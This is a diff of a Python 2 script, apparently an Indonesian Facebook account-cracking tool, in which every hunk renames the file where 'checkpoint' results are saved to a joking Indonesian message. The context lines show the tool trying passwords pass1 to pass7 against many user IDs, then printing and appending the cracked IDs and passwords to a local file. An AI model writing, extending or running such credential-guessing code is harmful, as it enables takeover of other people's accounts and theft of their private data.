@@ -332,7 +332,7 @@ def pilih_super():
 					print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
 					print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
 					print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass1 + '\n'
-					cek = open("out/super_cp.txt", "a")
+					cek = open("out/Author sangat suka cwek yg namanya ALIFAH & kawan kawan _Tapi sayang cintanya Bertepuk seblah tangan __Tapi boong wkwkw Salam Kiddie hkhkhk.txt", "a")
 					cek.write("ID:" +user+ " Pw:" +pass1+"\n")
 					cek.close()
 					cekpoint.append(user+pass1)
@@ -352,7 +352,7 @@ def pilih_super():
 							print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
 							print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
 							print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass2 + '\n'
-							cek = open("out/super_cp.txt", "a")
+							cek = open("out/Author sangat suka cwek yg namanya ALIFAH & kawan kawan _Tapi sayang cintanya Bertepuk seblah tangan __Tapi boong wkwkw Salam Kiddie hkhkhk.txt", "a")
 							cek.write("ID:" +user+ " Pw:" +pass2+"\n")
 							cek.close()
 							cekpoint.append(user+pass2)
@@ -372,7 +372,7 @@ def pilih_super():
 									print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
 									print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
 									print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass3 + '\n'
-									cek = open("out/super_cp.txt", "a")
+									cek = open("out/Author sangat suka cwek yg namanya ALIFAH & kawan kawan _Tapi sayang cintanya Bertepuk seblah tangan __Tapi boong wkwkw Salam Kiddie hkhkhk.txt", "a")
 									cek.write("ID:" +user+ " Pw:" +pass3+"\n")
 									cek.close()
 									cekpoint.append(user+pass3)
@@ -392,7 +392,7 @@ def pilih_super():
 											print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
 											print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
 											print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass4 + '\n'
-											cek = open("out/super_cp.txt", "a")
+											cek = open("out/Author sangat suka cwek yg namanya ALIFAH & kawan kawan _Tapi sayang cintanya Bertepuk seblah tangan __Tapi boong wkwkw Salam Kiddie hkhkhk.txt", "a")
 											cek.write("ID:" +user+ " Pw:" +pass4+"\n")
 											cek.close()
 											cekpoint.append(user+pass4)
@@ -413,7 +413,7 @@ def pilih_super():
 													print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
 													print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
 													print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass5 + '\n'
-													cek = open("out/super_cp.txt", "a")
+													cek = open("out/Author sangat suka cwek yg namanya ALIFAH & kawan kawan _Tapi sayang cintanya Bertepuk seblah tangan __Tapi boong wkwkw Salam Kiddie hkhkhk.txt", "a")
 													cek.write("ID:" +user+ " Pw:" +pass5+"\n")
 													cek.close()
 													cekpoint.append(user+pass5)
@@ -433,7 +433,7 @@ def pilih_super():
 															print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
 															print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
 															print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass6 + '\n'
-															cek = open("out/super_cp.txt", "a")
+															cek = open("out/Author sangat suka cwek yg namanya ALIFAH & kawan kawan _Tapi sayang cintanya Bertepuk seblah tangan __Tapi boong wkwkw Salam Kiddie hkhkhk.txt", "a")
 															cek.write("ID:" +user+ " Pw:" +pass6+"\n")
 															cek.close()
 															cekpoint.append(user+pass6)
@@ -453,7 +453,7 @@ def pilih_super():
 															                print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
 															                print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
 															                print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass7 + '\n'
-															                cek = open("out/super_cp.txt", "a")
+															                cek = open("out/Author sangat suka cwek yg namanya ALIFAH & kawan kawan _Tapi sayang cintanya Bertepuk seblah tangan __Tapi boong wkwkw Salam Kiddie hkhkhk.txt", "a")
 															                cek.write("ID:" +user+ " Pw:" +pass7+"\n")
 															                cek.close()
 															                cekpoint.append(user+pass7)
@@ -465,7 +465,7 @@ def pilih_super():
 	p.map(main, id)
 	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
 	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
-	print("\033[1;96m[+] \033[1;92mCP File tersimpan \033[1;91m: \033[1;97mout/super_cp.txt")
+	print("\033[1;96m[+] \033[1;92mCP File tersimpan \033[1;91m: \033[1;97mout/Author sangat suka cwek yg namanya ALIFAH & kawan kawan _Tapi sayang cintanya Bertepuk seblah tangan __Tapi boong wkwkw Salam Kiddie hkhkhk.txt")
 	raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
 	super()
 
